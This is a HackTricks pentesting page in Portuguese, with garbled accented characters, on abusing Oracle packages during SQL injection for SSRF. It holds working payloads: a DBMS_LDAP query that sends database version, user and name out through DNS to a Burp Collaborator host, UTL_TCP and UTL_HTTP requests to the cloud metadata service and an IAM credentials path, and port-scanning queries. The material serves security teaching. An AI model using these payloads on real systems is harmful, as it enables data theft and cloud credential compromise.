# InjeÃ§Ã£o no Oracle

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* VocÃª trabalha em uma **empresa de seguranÃ§a cibernÃ©tica**? VocÃª quer ver sua **empresa anunciada no HackTricks**? ou vocÃª quer ter acesso Ã  **Ãºltima versÃ£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A FamÃ­lia PEASS**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositÃ³rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositÃ³rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## SSRF

Usar o Oracle para fazer solicitaÃ§Ãµes HTTP e DNS fora de banda Ã© bem documentado, mas como meio de exfiltrar dados SQL em injeÃ§Ãµes. Sempre podemos modificar essas tÃ©cnicas/funÃ§Ãµes para fazer outras SSRF/XSPA.

A instalaÃ§Ã£o do Oracle pode ser muito dolorosa, especialmente se vocÃª quiser configurar uma instÃ¢ncia rÃ¡pida para testar comandos. Meu amigo e colega da [Appsecco](https://appsecco.com), [Abhisek Datta](https://github.com/abhisek), me indicou [https://github.com/MaksymBilenko/docker-oracle-12c](https://github.com/MaksymBilenko/docker-oracle-12c), que me permitiu configurar uma instÃ¢ncia em uma mÃ¡quina Ubuntu AWS t2.large usando o Docker.

Executei o comando docker com a flag `--network="host"` para que eu pudesse simular o Oracle como uma instalaÃ§Ã£o nativa com acesso total Ã  rede, durante o decorrer deste post do blog.
```
docker run -d --network="host" quay.io/maksymbilenko/oracle-12c
```
#### Pacotes Oracle que suportam uma especificaÃ§Ã£o de URL ou Nome de Host/NÃºmero de Porta <a href="#oracle-packages-that-support-a-url-or-a-hostname-port-number-specification" id="oracle-packages-that-support-a-url-or-a-hostname-port-number-specification"></a>

Para encontrar quaisquer pacotes e funÃ§Ãµes que suportem uma especificaÃ§Ã£o de host e porta, executei uma pesquisa no Google na [DocumentaÃ§Ã£o Online do Oracle Database](https://docs.oracle.com/database/121/index.html). Especificamente,
```
site:docs.oracle.com inurl:"/database/121/ARPLS" "host"|"hostname" "port"|"portnum"
```
A pesquisa retornou os seguintes resultados (nem todos podem ser usados para realizar uma rede de saÃ­da)

* DBMS\_NETWORK\_ACL\_ADMIN
* UTL\_SMTP
* DBMS\_XDB
* DBMS\_SCHEDULER
* DBMS\_XDB\_CONFIG
* DBMS\_AQ
* UTL\_MAIL
* DBMS\_AQELM
* DBMS\_NETWORK\_ACL\_UTILITY
* DBMS\_MGD\_ID\_UTL
* UTL\_TCP
* DBMS\_MGWADM
* DBMS\_STREAMS\_ADM
* UTL\_HTTP

Essa pesquisa rudimentar obviamente ignora pacotes como `DBMS_LDAP` (que permite passar um nome de host e nÃºmero de porta) como [a pÃ¡gina de documentaÃ§Ã£o](https://docs.oracle.com/database/121/ARPLS/d\_ldap.htm#ARPLS360) simplesmente aponta para uma [localizaÃ§Ã£o diferente](https://docs.oracle.com/database/121/ARPLS/d\_ldap.htm#ARPLS360). Portanto, pode haver outros pacotes Oracle que podem ser abusados para fazer solicitaÃ§Ãµes de saÃ­da que eu possa ter perdido.

De qualquer forma, vamos dar uma olhada em alguns dos pacotes que descobrimos e listamos acima.

**DBMS\_LDAP.INIT**

O pacote `DBMS_LDAP` permite o acesso a dados de servidores LDAP. A funÃ§Ã£o `init()` inicializa uma sessÃ£o com um servidor LDAP e recebe um nome de host e nÃºmero de porta como argumento.

Essa funÃ§Ã£o jÃ¡ foi documentada anteriormente para mostrar a exfiltraÃ§Ã£o de dados por meio do DNS, como abaixo
```
SELECT DBMS_LDAP.INIT((SELECT version FROM v$instance)||'.'||(SELECT user FROM dual)||'.'||(select name from V$database)||'.'||'d4iqio0n80d5j4yg7mpu6oeif9l09p.burpcollaborator.net',80) FROM dual;
```
No entanto, dado que a funÃ§Ã£o aceita um nome de host e um nÃºmero de porta como argumentos, vocÃª tambÃ©m pode usÃ¡-la como um scanner de portas.

Aqui estÃ£o alguns exemplos:
```
SELECT DBMS_LDAP.INIT('scanme.nmap.org',22) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',25) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',80) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',8080) FROM dual;
```
Um `ORA-31203: DBMS_LDAP: PL/SQL - Falha na InicializaÃ§Ã£o.` indica que a porta estÃ¡ fechada, enquanto um valor de sessÃ£o aponta para a porta estar aberta.

**UTL\_SMTP**

O pacote `UTL_SMTP` Ã© projetado para enviar e-mails por SMTP. O exemplo fornecido no [site de documentaÃ§Ã£o da Oracle mostra como vocÃª pode usar esse pacote para enviar um e-mail](https://docs.oracle.com/database/121/ARPLS/u\_smtp.htm#ARPLS71478). Para nÃ³s, no entanto, o interessante Ã© a capacidade de fornecer um host e especificaÃ§Ã£o de porta.

Um exemplo simples Ã© mostrado abaixo com a funÃ§Ã£o `UTL_SMTP.OPEN_CONNECTION`, com um tempo limite de 2 segundos.
```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',80,2);
END;
```

```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',8080,2);
END;
```
Um `ORA-29276: transfer timeout` indica que a porta estÃ¡ aberta, mas nenhuma conexÃ£o SMTP foi estabelecida, enquanto um `ORA-29278: SMTP transient error: 421 Service not available` indica que a porta estÃ¡ fechada.

**UTL\_TCP**

O pacote `UTL_TCP` e seus procedimentos e funÃ§Ãµes permitem a comunicaÃ§Ã£o baseada em TCP/IP com serviÃ§os. Se programado para um serviÃ§o especÃ­fico, este pacote pode se tornar facilmente uma forma de acessar a rede ou realizar solicitaÃ§Ãµes completas do lado do servidor, pois todos os aspectos de uma conexÃ£o TCP/IP podem ser controlados.

O exemplo no [site de documentaÃ§Ã£o da Oracle mostra como vocÃª pode usar este pacote para fazer uma conexÃ£o TCP bruta para buscar uma pÃ¡gina da web](https://docs.oracle.com/cd/B28359\_01/appdev.111/b28419/u\_tcp.htm#i1004190). Podemos simplificÃ¡-lo um pouco mais e usÃ¡-lo para fazer solicitaÃ§Ãµes Ã  instÃ¢ncia de metadados, por exemplo, ou a um serviÃ§o TCP/IP arbitrÃ¡rio.
```
set serveroutput on size 30000;
SET SERVEROUTPUT ON
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('169.254.169.254',80,tx_timeout => 2);
retval := utl_tcp.write_line(c, 'GET /latest/meta-data/ HTTP/1.0');
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
/
```

```
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('scanme.nmap.org',22,tx_timeout => 4);
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
```
Interessantemente, devido Ã  capacidade de criar solicitaÃ§Ãµes TCP brutas, este pacote tambÃ©m pode ser usado para consultar o serviÃ§o de metadados da instÃ¢ncia de todos os provedores de nuvem, pois o tipo de mÃ©todo e os cabeÃ§alhos adicionais podem ser passados dentro da solicitaÃ§Ã£o TCP.

**UTL\_HTTP e SolicitaÃ§Ãµes Web**

Talvez a tÃ©cnica mais comum e amplamente documentada em todos os tutoriais de InjeÃ§Ã£o de SQL Oracle fora de banda seja o pacote [`UTL_HTTP`](https://docs.oracle.com/database/121/ARPLS/u\_http.htm#ARPLS070). Este pacote Ã© definido pela documentaÃ§Ã£o como - `O pacote UTL_HTTP realiza chamadas de protocolo de transferÃªncia de hipertexto (HTTP) do SQL e PL/SQL. VocÃª pode usÃ¡-lo para acessar dados na Internet por meio do HTTP.`
```
select UTL_HTTP.request('http://169.254.169.254/latest/meta-data/iam/security-credentials/adminrole') from dual;
```
VocÃª tambÃ©m pode usar isso para realizar uma varredura bÃ¡sica de portas com consultas como
```
select UTL_HTTP.request('http://scanme.nmap.org:22') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:8080') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:25') from dual;
```
Um `ORA-12541: TNS:no listener` ou um `TNS:operation timed out` Ã© um sinal de que a porta TCP estÃ¡ fechada, enquanto um `ORA-29263: HTTP protocol error` ou dados Ã© um sinal de que a porta estÃ¡ aberta.

Outro pacote que jÃ¡ usei no passado com sucesso variado Ã© o mÃ©todo [`GETCLOB()` do tipo abstrato Oracle `HTTPURITYPE`](https://docs.oracle.com/database/121/ARPLS/t\_dburi.htm#ARPLS71705) que permite interagir com uma URL e oferece suporte para o protocolo HTTP. O mÃ©todo `GETCLOB()` Ã© usado para buscar a resposta GET de uma URL como um [tipo de dado CLOB](https://docs.oracle.com/javadb/10.10.1.2/ref/rrefclob.html)[select HTTPURITYPE('http://169.254.169.254/latest/meta-data/instance-id').getclob() from dual;![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/22.png)](https://docs.oracle.com/javadb/10.10.1.2/ref/rrefclob.html)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* VocÃª trabalha em uma **empresa de ciberseguranÃ§a**? VocÃª quer ver sua **empresa anunciada no HackTricks**? ou vocÃª quer ter acesso Ã  **Ãºltima versÃ£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A FamÃ­lia PEASS**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositÃ³rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositÃ³rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
